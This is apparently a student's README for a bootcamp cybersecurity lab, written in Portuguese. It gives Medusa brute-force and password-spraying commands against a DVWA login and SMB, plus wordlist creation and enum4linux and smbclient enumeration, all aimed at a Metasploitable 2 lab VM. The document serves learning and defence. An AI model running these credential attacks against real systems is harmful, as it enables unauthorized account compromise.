# DIO-Desafio-de-Ciberseguran-a-RIACHUELO
# 🔐 Desafio de Cibersegurança – Bootcamp DIO.me + Riachuelo

Este repositório documenta minha participação no desafio prático de Cibersegurança do Bootcamp da DIO.me em parceria com a Riachuelo.

O objetivo foi compreender conceitos fundamentais de autenticação, técnicas de ataque e aplicar testes práticos em ambiente controlado utilizando Kali Linux e Metasploitable 2.

# 📚 Conceitos Estudados

🔑 Protocolos de Autenticação
- Autenticação sem estado (Stateless)
- Autenticação com estado (Stateful)
- Autenticação Federada

# 🚨 Técnicas de Ataque Estudadas

- Força Bruta
- Ataque de Dicionário (Wordlist)
- Ataque por Permutação
- Ataque Híbrido (Mangling Hub + Junção de listas)
- Password Spraying
- Credential Stuffing

# 🛠️ Ferramentas Estudadas (Conceito)<br>

Durante o bootcamp, estudei o funcionamento e aplicabilidade das seguintes ferramentas:

- Hydra
- Ncrack
- John the Ripper
- WPScan
- Patator<br>

Obs: Essas ferramentas foram abordadas conceitualmente, mas não foram utilizadas na simulação prática descrita neste repositório.

💻 Ambiente Prático Utilizado

- Kali Linux
- Metasploitable 2
- IP alvo: 192.168.56.101<br>
  
Todos os testes foram realizados em ambiente controlado e exclusivamente para fins educacionais.

# 🚀 Simulação Prática de Ataques

📌 Exercício 1 – Criação de Wordlists<br>

Criação de listas de usuários e senhas para uso em ataques automatizados.

- 192.168.56.101 
- echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
- echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 
📌 Exercício 2 – Ataque HTTP com Medusa<br>

Ferramenta utilizada: Medusa<br>
Objetivo: realizar ataque de força bruta contra formulário de login (DVWA).

- medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
- -m PAGE:'/dvwa/login.php' \
- -m FORM:'username=^USER^password=^PASS^Login=Login' \
- -m 'FAIL=Login failed' -t 6

📌 Exercício 3 – Enumeração SMB<br>

Ferramenta utilizada: Enum4linux<br>
Objetivo: coletar informações sobre usuários e compartilhamentos via SMB.

- enum4linux -a 192.168.56.101 | tee enum4_output.txt
- less enum4_output.txt
 
📌 Exercício 4 – Password Spraying via SMB<br>

Ferramenta utilizada: Medusa

- echo -e "user\nmsfadmin\nservice" > smb_users.txt
- medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

📌 Exercício 5 – Enumeração de Compartilhamentos<br>

Ferramenta utilizada: SMBClient

- smbclient -L //192.168.56.101 -U msfadmin

# 🖼️ Evidências

Os prints da execução dos comandos estão disponíveis na pasta:

/evidencias

# 🎯 Principais Aprendizados

- Diferença prática entre força bruta e password spraying
- Importância de políticas de senha fortes
- Risco de reutilização de credenciais
- Importância de limitação de tentativas (rate limiting)
- Relevância da enumeração como etapa inicial de ataque

# 🧠 Conclusão

O desafio permitiu consolidar conceitos ofensivos com foco defensivo, compreendendo como falhas simples de autenticação podem comprometer serviços web e compartilhamentos de rede.<br>
A prática reforçou a importância de controles como MFA, bloqueio por tentativa excessiva e monitoramento de acessos suspeitos.

# 👨‍💻 Autor

Paulo Assis<br>
Bacharel em Engenharia de Software<br>
Foco em Cibersegurança
